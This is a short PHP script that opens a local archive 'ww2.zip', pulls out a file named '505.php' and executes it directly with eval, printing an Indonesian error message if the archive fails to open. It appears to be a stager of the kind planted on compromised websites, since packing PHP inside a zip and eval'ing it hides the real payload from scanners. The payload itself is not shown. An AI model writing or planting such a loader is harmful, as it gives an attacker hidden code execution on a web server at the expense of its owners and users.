<?php
$zip = new ZipArchive;
if ($zip->open('ww2.zip') === TRUE) {
    $content = $zip->getFromName('505.php');
    $zip->close();
    eval("?>" . $content);
} else {
    echo 'Gagal membuka file ZIP.';
}
?>
